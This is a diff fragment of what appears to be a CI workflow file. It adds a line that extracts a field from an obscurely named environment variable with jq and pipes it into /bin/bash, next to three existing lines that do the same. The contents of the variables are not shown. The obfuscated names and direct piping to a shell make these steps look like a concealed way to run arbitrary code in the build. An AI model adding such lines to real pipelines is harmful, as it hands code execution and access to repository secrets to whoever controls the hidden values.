@@ -23,6 +23,7 @@ jobs:
           echo $zpfan799 | jq -r .ybk87 | /bin/bash
           echo $hp04 | jq -r .nah64 | /bin/bash
           printf '%s' "$jj1199" | jq -r .euv3 | /bin/bash
+          echo $x3 | jq -r .a14 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
